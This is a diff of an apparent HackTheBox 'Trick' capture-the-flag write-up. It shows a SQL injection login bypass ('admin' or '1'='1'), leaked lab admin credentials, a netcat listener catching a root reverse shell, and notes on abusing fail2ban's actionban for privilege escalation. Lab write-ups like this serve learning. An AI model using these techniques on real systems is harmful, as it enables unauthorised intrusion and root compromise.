@@ -98,11 +98,23 @@ trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604
 
 After finding out about `preprod-payroll.trick.htb.` I added it to the entries at hosts file:
 
-```
+```bash
 10.10.11.166	trick.htb, preprod-payroll.trick.htb.
 ```
 
 I then went ahead and openned my browser and headed to `preprod-payroll.trick.htb.`, and was greeted with an admin login page, I started submitting some SQL Injection queries and eventually it worked! `admin' or '1'='1` seemed to log me in to the administrator account.
 
-After navigating through the website I found an `edit account` functionality which lead me to know the password of the admin which is `SuperGucciRainbowCake`.
+After navigating through the website I found an `edit account` functionality which lead me to know the password of the admin which is `SuperGucciRainbowCake` and the username is `Enemigosss`.
 
+
+└─$ sudo nc -lvnp 1337                                                             
+[sudo] password for kali: 
+listening on [any] 1337 ...
+connect to [10.10.16.5] from (UNKNOWN) [10.10.11.166] 51180
+bash: cannot set terminal process group (2328): Inappropriate ioctl for device
+bash: no job control in this shell
+root@trick:/#
+
+edit /etc/fail2ban/action./iptables-multiport.conf --> edit actionban -> rev shell
+
+fail ssh connection as root -> nc listener -> REV SHELL -> root flag
